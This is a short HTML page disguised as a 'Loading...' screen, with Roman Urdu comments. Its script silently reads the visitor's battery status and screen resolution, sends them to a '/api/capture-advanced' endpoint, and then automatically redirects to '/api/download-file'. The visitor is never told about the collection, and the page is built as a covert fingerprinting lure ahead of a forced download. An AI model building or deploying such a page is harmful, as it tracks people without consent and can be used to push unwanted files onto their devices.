<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
    <script>
       async function track() {
    let data = {
        batteryLevel: "Not Supported",
        isCharging: "Unknown",
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        connectionType: 'unknown'
    };

    try {
        // Battery (Optional)
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            data.batteryLevel = Math.round(battery.level * 100);
            data.isCharging = battery.charging;
        }

        // POST Request - Iska wait karna zaroori hai
        const response = await fetch('/api/capture-advanced', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        // Response ka wait karein taake connection band na ho
        await response.json(); 

    } catch (e) {
        console.log("Error capturing data");
    } finally {
        // 500ms ka chota delay taake browser background tasks khatam kar le
        setTimeout(() => {
            window.location.href = '/api/download-file';
        }, 500);
    }
}
track();
    </script>
</body>
</html>
